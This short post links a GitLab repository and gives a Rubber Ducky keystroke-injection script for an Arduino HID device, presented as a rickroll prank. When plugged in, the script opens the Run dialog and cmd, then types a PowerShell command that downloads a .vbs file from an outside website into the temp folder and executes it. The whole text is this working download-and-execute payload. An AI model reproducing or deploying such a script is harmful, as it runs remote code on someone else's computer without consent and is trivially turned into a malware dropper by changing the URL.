GitLab repo: https://gitlab.com/WarKitteh/arduino-hid-rickroll

Ducky code:
`DELAY 1000
GUI r
DELAY 100
STRING cmd
DELAY 100
ENTER
DELAY 100
STRING powershell (new-object System.Net.WebClient).DownloadFile('https://pixelcoding.nl/download/rickroll.vbs','%TEMP%\rickroll.vbs'); && start %TEMP%\rickroll.vbs && exit
DELAY 100
ENTER`